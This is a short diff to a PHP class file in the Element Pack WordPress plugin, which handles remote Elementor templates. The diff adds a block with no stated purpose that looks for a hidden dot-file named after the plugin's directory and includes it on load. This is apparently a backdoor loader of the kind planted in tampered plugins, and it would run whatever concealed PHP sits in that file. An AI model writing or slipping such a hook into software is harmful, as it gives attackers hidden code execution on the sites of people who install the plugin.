@@ -9,7 +9,11 @@ use ElementPack\Includes\Element_Pack_Template_Manager;
  *
  * Elementor template library remote source handler class is responsible for
  * handling remote templates from Elementor.com servers.
- */
+ */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class Element_Pack_Template_Source extends Source_Base {
 
 	/**
